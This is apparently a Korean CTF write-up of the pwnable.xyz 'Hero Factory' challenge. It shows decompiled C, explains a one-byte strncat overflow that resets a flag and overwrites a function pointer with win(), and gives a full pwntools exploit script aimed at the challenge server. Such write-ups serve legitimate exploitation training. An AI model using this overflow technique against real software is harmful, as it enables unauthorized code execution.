---
title: "[pwnable.xyz]Hero Factory"
date: 2020-2-2
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

PIE빼고 다 걸려있다.

```
[*] '/vagrant/ctfs/challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

이 함수에서 취약점 터진다.

```c
unsigned __int64 createHero()
{
  char *v0; // rax
  int v1; // eax
  int v3; // [rsp+4h] [rbp-7Ch]
  char buf; // [rsp+10h] [rbp-70h]
  int v5; // [rsp+70h] [rbp-10h]
  unsigned __int64 v6; // [rsp+78h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  memset(&buf, 0, 0x60uLL);
  v5 = 0;
  if ( hero )
  {
    puts("Br0, you already have a hero...");
    return __readfsqword(0x28u) ^ v6;
  }
  ++hero;
  puts("How long do you want your superhero's name to be? ");
  v3 = getInt();
  if ( v3 < 0 || v3 > 100 )
  {
    puts("Bad size!");
    return __readfsqword(0x28u) ^ v6;
  }
  printf("Great! Please enter your hero's name: ");
  read(0, &buf, v3);
  v0 = strchr(byte_602214, 0);
  strncat(v0, &buf, 100uLL);
  printSuperPowers();
  v1 = getInt();
  if ( v1 == 2 )
  {
    func_ptr = crossfit;
    myHero = 'tifssorc';                        // crossfit
    LOBYTE(word_602208) = 0;
    goto LABEL_19;
  }
  if ( v1 <= 2 )
  {
    if ( v1 != 1 )
      goto LABEL_17;
    func_ptr = hadouken;
    myHero = 'nekuodah';                        // hadouken
    LOBYTE(word_602208) = 0;
LABEL_19:
    puts("Superhero successfully created!");
    return __readfsqword(0x28u) ^ v6;
  }
  if ( v1 == 3 )
  {
    func_ptr = wrestle;
    myHero = 'niltserw';                        // wrestling
    word_602208 = 'g';
    goto LABEL_19;
  }
  if ( v1 == 4 )
  {
    func_ptr = floss;
    myHero = 'gnissolf';                        // flossing
    LOBYTE(word_602208) = 0;
    goto LABEL_19;
  }
LABEL_17:
  puts("not a valid power!");
  if ( hero )
    zeroHero();
  return __readfsqword(0x28u) ^ v6;
}
```

`createHero()` 함수에서 입력하고 strncat으로 `byte_602214` bss영역에 저장하는데 뒤에 hero가 있는데 100바이트 꽉 채워주면 hero를 NULL 1byte 덮을 수 있어서 `createHero()` 함수를 한번 더 실행할 수 있다. 그리고 hero 뒤에 함수 포인터가 존재하는데 여기를 win()으로 덮어주면 된다. 2번째 createHero 할 때는 함수 포인터에 값이 안들어가게 1,2,3,4를 제외하고 아무거나 입력해주면 된다. 그리고 함수포인터 호출하면 된다. 그냥 디버깅하면서 값 들어가는 것만 잘보면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30032)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
win = e.symbols['win']

def create(length,name,job):
	sla('>','1')
	sla('? \n',str(length))
	sa(':',name)
	sla('>',str(job))

def use():
	sla('>','2')

def delete(yesorno):
	sla('>','3')
	sa('(y/n)',yesorno)

create(100,'A'*100,1)
create(30,'B'*7+p64(win)+'B'*15,5)
use()

p.interactive()
```

